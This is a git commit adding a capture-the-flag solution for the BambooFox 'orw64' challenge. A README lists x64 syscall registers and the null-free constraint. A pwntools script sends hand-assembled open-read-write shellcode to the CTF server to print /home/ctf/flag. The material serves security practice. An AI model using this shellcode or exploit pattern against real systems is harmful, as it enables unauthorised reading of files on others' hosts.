cf219bd75a385911c7c7fb535dded21b27cb89d8
yuan <zodf0055980@gmail.com>
2019-07-25 19:10:22 +0800

    orw pwm in x64

---
+++ bamboofox/orw64/README.md
@@ -0,0 +1,22 @@
+# 解答
+%rax | System call | %rdi |  %rsi | %rdx
+--- | --- | --- | --- | ---
+0 | sys_read | unsigned | int fd | char *buf	size_t count
+1 | sys_write | unsigned | int fd | const char *buf	size_t count		
+2 | sys_open | const char *filename | int flags	| int mode	
+
+Read :
+rdx = length 要用長一點
+rsi = addr to buffer = open 的  rsp
+rdi = fd = open 回傳 rax
+
+Write ：
+寫到螢幕上
+rdi = STDOUT_FILENO = 1
+rsi = 不變
+rdx = length = read 回傳的 rax
+
+要求null-free(攻擊字串間不能夠有\x00)
+
+把 shellcode 轉 hex
+https://defuse.ca/online-x86-assembler.htm
---
+++ bamboofox/orw64/slove.py
@@ -0,0 +1,43 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+ip = "bamboofox.cs.nctu.edu.tw"
+port = 11101
+r = remote(ip,port)
+
+context.arch = 'amd64'
+
+shellcode = asm('''
+open:
+xor rsi, rsi
+xor rdx, rdx
+mov rax, 0x67616c662f661111
+shr rax, 16
+push rax
+mov rax, 0x74632f656d6f682f
+push rax
+mov rdi, rsp
+xor rax, rax
+inc rax
+inc rax
+syscall
+read:
+mov rdi, rax
+xor rax, rax
+mov rsi, rsp
+xor rdx, rdx
+inc rdx
+shl rdx, 0x6
+write:
+syscall
+mov rdx, rax
+xor rax, rax
+inc rax
+xor rdi, rdi
+inc rdi
+syscall
+''')
+# /home/ctf/flag  =>  0x2f686f6d652f6374 662f666c6167
+r.sendline(shellcode)
+r.interactive()
